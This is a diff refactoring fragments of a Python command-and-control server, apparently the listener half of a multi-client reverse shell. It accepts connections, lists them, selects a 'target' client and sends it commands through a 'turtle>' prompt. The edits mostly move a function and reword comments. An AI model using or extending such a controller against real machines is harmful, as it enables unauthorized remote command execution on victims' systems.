@@ -3,7 +3,6 @@ import threading
 import time
 from queue import Queue
 
-
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
@@ -34,11 +33,11 @@ def socket_bind():
         s.listen(5)
     except socket.error as msg:
         print("Socket binding error: " + str(msg))
-        time.sleep(3)
+        time.sleep(5)
         socket_bind()
 
 
-# Replaces socket_accept()
+# Accept connections from multiple clients and save to list
 def accept_connections():
     for c in all_connections:
         c.close()
@@ -55,7 +54,23 @@ def accept_connections():
             print('Error accepting connections')
 
 
-# List connections
+# Interactive prompt for sending commands remotely
+def start_turtle():
+    global s
+    while True:
+        cmd = input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+            continue
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print('Command not recognized')
+
+
+# List all connections
 def list_connections():
     results = ''
     for i, conn in enumerate(all_connections):
@@ -70,7 +85,7 @@ def list_connections():
     print('----- Clients -----' + '\n' + results)
 
 
-# Select a target
+# Select a target client
 def get_target(cmd):
     try:
         target = cmd.replace('select ', '')
@@ -101,22 +116,6 @@ def send_target_commands(conn):
             break
 
 
-# Replaces send_commands(conn)
-def start_turtle():
-    global s
-    while True:
-        cmd = input('turtle> ')
-        if cmd == 'list':
-            list_connections()
-            continue
-        elif 'select' in cmd:
-            conn = get_target(cmd)
-            if conn is not None:
-                send_target_commands(conn)
-        else:
-            print('Command not recognized')
-
-
 # Create worker threads (will die when main exits)
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
@@ -125,7 +124,7 @@ def create_workers():
         t.start()
 
 
-# Do the next job in the queue
+# Do the next job in the queue (thread for handling connections, another for sending commands)
 def work():
     while True:
         x = queue.get()
